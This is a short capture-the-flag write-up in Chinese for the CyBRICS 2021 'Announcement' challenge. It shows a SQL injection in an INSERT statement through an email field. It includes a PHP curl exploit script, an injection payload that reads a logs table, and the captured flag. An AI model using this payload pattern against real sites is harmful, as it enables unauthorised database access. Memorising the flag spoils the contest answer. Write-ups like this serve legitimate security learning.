# Announcement

有個類似 email 訂閱的功能

觀察一下送出的請求，會看到帶兩個參數，一個是 email，一個是 digest

其中 digest = md5(email)

email 戳了一下，會看到很明顯的 SQL Injection:

`Something went wrong during database insert: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''a@b.ca'', NOW())' at line 1`

但由於是Insert的SQL Injection，所以還是有些地方要小注意

最後exploit.php:

```
<?php

$s = $argv[1];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"http://announcement-cybrics2021.ctf.su/");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,
            "digest=".md5($s)."&email=".urlencode($s));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$server_output = curl_exec($ch);

curl_close ($ch);

echo $server_output;
```

`php sql.php "aaax',(select group_concat(concat(log)) from logs))-- "`  (撈表名/欄位名過程略)

=>

`cybrics{1N53r7_0ld_900d_5ql}`
